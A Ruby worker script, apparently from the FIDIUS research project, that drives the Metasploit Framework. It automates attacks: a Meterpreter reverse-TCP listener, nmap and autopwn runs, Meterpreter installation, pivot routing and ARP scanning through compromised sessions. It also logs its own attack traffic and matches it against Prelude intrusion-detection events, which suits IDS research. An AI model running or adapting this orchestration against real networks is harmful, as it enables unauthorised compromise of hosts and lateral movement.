require 'rubygems'
require "#{RAILS_ROOT}/script/worker/loader"
require "#{RAILS_ROOT}/script/worker/msf_session_event"
require "#{RAILS_ROOT}/script/worker/prelude_event_fetcher.rb"
require "#{RAILS_ROOT}/app/helpers/log_matches_helper.rb"
require "#{RAILS_ROOT}/script/worker/tcpdump_wrapper.rb"
require 'socket'

require 'drb'
require 'pp'

module FIDIUS
  class MSFWorker
    include LogMatchesHelper
    PID_FILE = File.join RAILS_ROOT, 'tmp', 'pids', 'msf-worker'

    attr_reader :status

    def p *obj # :nodoc:
      pp *obj
    end
    
    def puts *obj # :nodoc:
      WorkerLog.establish_connection DB_SETTINGS unless WorkerLog.connected?
      obj.each do |o|
        WorkerLog.create :message => o
      end
      if ob = obj.shift
        $stdout.puts "[#{Time.now.strftime '%Y-%m-%d %H:%M:%S'}] FIDIUS MSF worker: #{ob}"
        obj.each {|o| $stdout.puts "\t#{o}" } if obj.size > 0
      end
    end

    def initialize
      @status = 'initializing'
      puts "Generated new worker object."
    end
    
    def start
      @status = 'starting'
      puts "Starting. Will listen on #{DRb.uri}..."
      File.open(PID_FILE, 'w') do |f|
        f.puts Process.pid
      end
      
      puts "Initializing MSF..."
      @framework =  Msf::Simple::Framework.create
      puts "Initialized MSF."

      connect_db
      begin
        @framework.db.exploited_hosts.each do |h|
          h.delete
        end
      rescue ::Exception
        puts "An error occurred while deleting exploited hosts."
        raise
      end

      handler = FIDIUS::Session::MsfSessionEvent.new
      @framework.events.add_session_subscriber(handler)
      @prelude_fetcher = PreludeEventFetcher.new
      load_plugins

      puts "Starting tcp reverse handler"
      run_exploit "exploit/multi/handler", {'LHOST' => '0.0.0.0', 'LPORT' => '5555', 'payload' => 'windows/meterpreter/reverse_tcp'}, true

      # init TcpDumper
      if (MSF_SETTINGS.select("/match_prelude_logs").first.value == "true")
        @tcpdump = TcpDumpWrapper.new(MSF_SETTINGS["/tcpdump_iface"])
        @tcpdump.deactivate if MSF_SETTINGS.select("/match_prelude_logs").first.value == "false"
      end
      puts "Started."
      @status = 'running'
    end
    
    def stop
      @status = 'stopping'
      @tcpdump.stop

      puts "Halting..."
      @framework.sessions.each_pair do |i,session|
        puts "Killing session #{i}: #{session}"
        session.kill
      end
      disconnect_db
      File.delete PID_FILE if File.exist? PID_FILE
      DRb.stop_service
      puts "Halted."
    end

    def exec_task task, async = true
      cmd = task.module.split
      command = "cmd_#{cmd.shift}"
      if commands.include? command
        if async
          thread = Thread.new do
            begin
              task.progress = 1
              task.status = "running asynchron"
              task.save
              send command.to_sym, cmd, task
              task.progress = 100
              task.status = "done"
              task.save
            rescue ::Exception
              puts "Failed executing '#{command}, #{cmd.join ', '}' on task ##{task.id}.", $!, *$!.backtrace
              task.progress = -1
              task.status = "failed"
              task.error = $!.to_s
              task.save
            end
          end
        else
          task.progress = 1
          task.status = "running"
          task.save
          send command.to_sym, cmd, task
          task.progress = 100
          task.status = "done"
          task.save
        end
      else
        raise "Unknown command: #{command}."
      end
    end

    def cmd_nmap args, task = nil
      manager = SubnetManager.new @framework, args[0]
      manager.run_nmap
    end

    def cmd_session_install args, task=nil
      session = get_session_by_uuid @framework.sessions, args[0]
      return unless session
      return unless session.type == 'meterpreter'
      FIDIUS::Session::install_meterpreter(session)
    end

    def cmd_exec_reconnaissance args, task=nil
      begin
        puts "exec reconnaissance"
        
        session = get_session_by_uuid @framework.sessions, args[0]
        puts "session: #{session}"
        script_path = File.join "#{RAILS_ROOT}", "script","reconnaissance", "reconnaissance.rb"
        session.execute_file(script_path,"")
        puts "exec finish"
      rescue
        puts $!
      end
      puts "fertig"
    end
    
    def cmd_add_route_to_session args, task=nil
      puts "add_route_to_session"
      session = get_session_by_uuid @framework.sessions, args[0]
      return unless session
      return unless session.type == 'meterpreter'
      FIDIUS::Session::add_route_to_session(session)
    end

    def get_session_by_uuid sessions, uuid
      sessions.each_sorted do |s|
        if session = sessions.get(s)
          return session if session.uuid == uuid
        end
      end
    end

    def cmd_autopwn args, task = nil
      lhost = nil
      Rex::Socket::SwitchBoard.each do | route | 
        route.comm.net.config.each_route do | ipaddr | 
          if (IPAddr.new "#{ipaddr.subnet}/#{ipaddr.netmask}").include? IPAddr.new args[0]
            lhost = ipaddr.gateway
          end
        end
      end
      autopwn args[0], lhost, task
    end

    def cmd_arp_scann_session args, task=nil
      session = get_session_by_uuid @framework.sessions, args[0]
      return unless session
      return unless session.type == 'meterpreter'
      session.net.config.each_route do |route|
        # Remove multicast and loopback interfaces
        next if route.subnet =~ /^(224\.|127\.)/
        next if route.subnet == '0.0.0.0'
        next if route.netmask == '255.255.255.255'
        next if (IPAddr.new "#{route.subnet}/#{route.netmask}").include? IPAddr.new session.target_host
        mask = IPAddr.new(route.netmask).to_i.to_s(2).count("1")
        discovered_hosts = arp_scann(session, "#{route.subnet}/#{mask}")
        discovered_hosts.each do |hostaddress| 
          host = Msf::DBManager::Host.find_by_address hostaddress
          pivot_exploited_host = Msf::DBManager::ExploitedHost.find_by_session_uuid args[0]
          host.pivot_host_id = pivot_exploited_host.host_id if host != nil and pivot_exploited_host != nil
          host.save
        end
      end
    end
    
    def cmd_tcp_scanner rhost, ports = '1-10000'
      options = {'RHOSTS' => rhost, 'PORTS' => ports }
      run_exploit "auxiliary/scanner/portscan/tcp", options
    end

    def autopwn iprange, lhost, task = nil
      manager = SubnetManager.new @framework, iprange, 1, nil, lhost
      my_ip = get_my_ip iprange
      # tell our prelude fetcher that we want to have all events we generate in
      # prelude from now on
      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
        @prelude_fetcher.attack_started
        # let tcpdump watch our traffic
        @tcpdump.start
      end
      manager.run_nmap
      # now stop sniffing traffic
      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
        @tcpdump.stop
        # and read out relevant packets most of them should be
        # a result of run_nmap
        @tcpdump.read do |src_ip, src_port, dst_ip, dst_port, payload|
          # we are interested in traffic, that we generated 
          if src_ip == my_ip
            PayloadLog.create(
              :exploit => "nmap",
              :payload => payload,
              :src_addr => src_ip,
              :dest_addr => dst_ip,
              :src_port => src_port,
              :dest_port => dst_port,
              :task_id => task.id
            )
          end
        end
      end      
      # we do not want to use nmap for autopwn
      s = manager.get_sessions(false) 
      if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
        @prelude_fetcher.get_events(my_ip).each do |ev|
          puts "save prelude event #{ev.id}"
          PreludeLog.create(
            :task_id => task.id,
            :payload => ev.payload,
            :detect_time => ev.detect_time,
            :dest_ip => ev.dest_ip,
            :dest_port => ev.dest_port,
            :src_ip => ev.source_ip,
            :src_port => ev.source_port,
            :text => ev.text,
            :severity => ev.severity,
            :analyzer_model => ev.analyzer_model,
            :ident => ev.id
          )
        end
        puts "saving of events finished"
      end

      # after autopwn finished
      # we have all payload-logs from metasploit
      # and all prelude logs
      # now lets match them against each other for the given task_id
      if task
        if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
          puts "Matching Payloads against Prelude logs..."
          calculate_matches_between_payloads_and_prelude_logs(task.id)
          puts "Matching done."
        end
      end
      puts "autopwn finished"
    end

    def arp_scann(session, cidr)
      puts("ARP Scanning #{cidr}")
      ws = session.railgun.ws2_32
      iphlp = session.railgun.iphlpapi
      i, a = 0, []
      iplst = []
      found = []
      ipadd = Rex::Socket::RangeWalker.new(cidr)
      numip = ipadd.num_ips
      while (iplst.length < numip)
        ipa = ipadd.next_ip
        if (not ipa)
          break
        end
        iplst << ipa
      end
      iplst.each do |ip_text|
        if i < 10
          a.push(::Thread.new {
            h = ws.inet_addr(ip_text)
            ip = h["return"]
            h = iphlp.SendARP(ip,0,6,6)
            if h["return"] == session.railgun.const("NO_ERROR")
              mac = h["pMacAddr"]
              # XXX: in Ruby, we would do
              #   mac.map{|m| m.ord.to_s 16 }.join ':' 
              # and not
              mac_str = mac[0].ord.to_s(16) + ":" +
                  mac[1].ord.to_s(16) + ":" +
                  mac[2].ord.to_s(16) + ":" +
                  mac[3].ord.to_s(16) + ":" +
                  mac[4].ord.to_s(16) + ":" +
                  mac[5].ord.to_s(16)
              puts "IP: #{ip_text} MAC #{mac_str}"
              found << "#{ip_text}"
              if session.framework.db.active
                session.framework.db.report_host(
                  :workspace => session.framework.db.workspace,
                  :host => ip_text,
                  :mac  => mac_str.to_s.strip.upcase
                )
                cmd_tcp_scanner ip_text, '22,23,80,120-140,440-450'
              end
            end
          })
        i += 1
        else
          sleep(0.05) and a.delete_if {|x| not x.alive?} while not a.empty?
          i = 0
        end
      end
      a.delete_if {|x| not x.alive?} while not a.empty?
      return found
    end

    def task_created
      Msf::DBManager::Task.find_new_tasks.each do |task|
        begin
          task.progress = 0
          task.save
          if MSF_SETTINGS.select("/match_prelude_logs").first.value == "true"
            Msf::Plugin::FidiusLogger.on_log do |caused_by, data, socket|
              my_ip = get_my_ip(socket.peerhost)
              PayloadLog.create(
                :exploit => caused_by,
                :payload => data,
                :src_addr => my_ip,
                :dest_addr => socket.peerhost,
                :src_port => socket.localport,
                :dest_port => socket.peerport,
                :task_id => task.id
              )
            end
          end
          exec_task task
        rescue ::Exception
          puts "An error occurred while executing task ##{task.id}", $!, *$!.backtrace
          task.error = $!.to_s
          task.save
          raise
        end
      end
    end
  
  private

    def commands
      @commands ||= (self.methods - Object.instance_methods).select do |m|
        m =~ /^cmd_/
      end
      @commands
    end

    #
    # returns the ip address of that interface, which would connect to
    # an address of the given +iprange+.
    #
    # see also https://coderrr.wordpress.com/2008/05/28/get-your-local-ip-address/
    #
    def get_my_ip iprange
      orig, Socket.do_not_reverse_lookup = Socket.do_not_reverse_lookup, true
      UDPSocket.open do |s|
        # udp is stateless, so there is no real connect
        s.connect IPAddr.new(iprange).to_s, 1
        s.addr.last
      end
    ensure
      Socket.do_not_reverse_lookup = orig
    end

    def run_exploit mod_name, options, non_blocking = false
      begin
        mod = nil
        unless (mod = @framework.modules.create(mod_name))
          puts("Failed to initilize #{mod_name}")
          return
        end

        options.each_pair do |key, value|
          mod.datastore[key] = value
        end

        cur_thread = Thread.new(mod) do |thread_mod|
          begin
            case thread_mod.type
            when Msf::MODULE_EXPLOIT
              thread_mod.exploit_simple(
                'Payload'  => thread_mod.datastore['PAYLOAD'],
                'Quiet'    => true,
                'RunAsJob' => false
              )
            when Msf::MODULE_AUX
              thread_mod.run_simple(
                'Quiet'    => true,
                'RunAsJob' => false
              )
            end
          rescue ::Exception
            puts(" >> subnet_manager exception during launch from #{mod_name}: #{$!} ") if $MY_DEBUG
          end
        end
      rescue ::Interrupt
        raise $!
      rescue ::Exception
        puts(" >> subnet_manager: exception from #{mod_name}: #{$!} #{$!.backtrace}")
      end
      return cur_thread if non_blocking
      cur_thread.join
    end

    def connect_db
      # set the db driver
      @framework.db.driver = DB_SETTINGS["adapter"]
      # create the options hash
      opts = {}
      opts['adapter'] = DB_SETTINGS["adapter"]
      opts['username'] = DB_SETTINGS["username"]
      opts['password'] = DB_SETTINGS["password"]
      opts['database'] = DB_SETTINGS["database"]
      opts['host'] =  DB_SETTINGS["host"]
      opts['port'] =  DB_SETTINGS["port"]
      opts['socket'] = DB_SETTINGS["socket"]
      
      # This is an ugly hack for a broken MySQL adapter:
      # http://dev.rubyonrails.org/ticket/3338
      # if (opts['host'].strip.downcase == 'localhost')
      #   opts['host'] = Socket.gethostbyname("localhost")[3].unpack("C*").join(".")
      # end
      puts "Connecting to database..."

      begin
        unless @framework.db.connect(opts)
          raise RuntimeError.new "Failed to connect to the database: #{@framework.db.error}. Did you edit the config.yaml?"
        end
      rescue ::Exception
        puts "Unable to connect to database."
        raise
      end

      puts "Connected to database."
    end
    
    def disconnect_db
      puts "Disconnecting database..."
      @framework.db.disconnect
      puts "Disconnected."
    end
  
    def load_plugins
      begin
        require "#{RAILS_ROOT}/script/worker/msf_payload_loader.rb"
        @framework.plugins.load("#{RAILS_ROOT}/script/worker/msf_plugins/payload_logger")
      rescue ::Exception
        puts "An error occurred while loading plugins", $!, *$!.backtrace
      end
    end
  end
end

drb_url = MSF_SETTINGS.select("/drb_url")
raise ArgumentError.new "No 'drb_url' in config/msf.yml specified." unless drb_url

worker = FIDIUS::MSFWorker.new
DRb.start_service drb_url.first.value, worker
worker.start

DRb.thread.join

worker.puts "Exiting."

